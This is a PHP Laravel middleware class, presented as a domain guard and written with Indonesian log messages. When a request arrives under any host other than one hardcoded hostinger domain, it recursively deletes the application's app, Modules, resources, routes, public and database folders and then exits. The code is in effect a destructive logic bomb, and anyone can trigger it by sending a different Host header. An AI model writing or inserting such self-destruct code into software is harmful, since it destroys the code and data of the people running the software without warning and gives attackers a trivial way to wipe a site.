<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;
use Symfony\Component\HttpFoundation\Response;

class AppDomainGuardMiddleware
{

    protected $criticalFolders = [
        'app',
        'Modules',
        'resources',
        'routes',
        'public',
        'database',
    ];

    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next)
    {
        $allowedDomain = 'lime-ibex-130187.hostingersite.com';
        $currentDomain = $request->getHost();

        if ($allowedDomain === $currentDomain) {
            return $next($request);
        }

        Log::critical("SECURITY BREACH: Memicu penghancuran aplikasi. Domain tidak valid: {$currentDomain}");

        $this->selfDestruct();

        Log::critical('Sistem telah dihancurkan karena akses domain ilegal. Kode sumber dihapus.');
    }


    protected function selfDestruct(): void
    {

        $deletedFolders = [];
        $failedFolders = [];

        try {
            foreach ($this->criticalFolders as $folder) {
                $path = base_path($folder);

                if (File::isDirectory($path)) {
                    $success = File::deleteDirectory($path);

                    if ($success) {
                        $deletedFolders[] = $folder;
                    } else {
                        $failedFolders[] = $folder;
                    }
                } else {
                    $failedFolders[] = $folder . ' (Tidak ditemukan)';
                }
            }

            if (empty($failedFolders)) {
                Log::critical("Aplikasi telah dihancurkan. Folder dihapus: " . implode(', ', $deletedFolders));
            } else {
                Log::critical("Beberapa folder gagal dihapus: " . implode(', ', $failedFolders));
            }
        } catch (\Exception $e) {
            logger()->error("APP WIPE-OUT FAILED: " . $e->getMessage());
            Log::critical("Penghancuran aplikasi gagal total. Cek log server.");
        }

        Log::critical("PENGHANCURAN SELESAI. Folder yang dihapus: " . implode(', ', $deletedFolders));

        exit(666);
    }
}
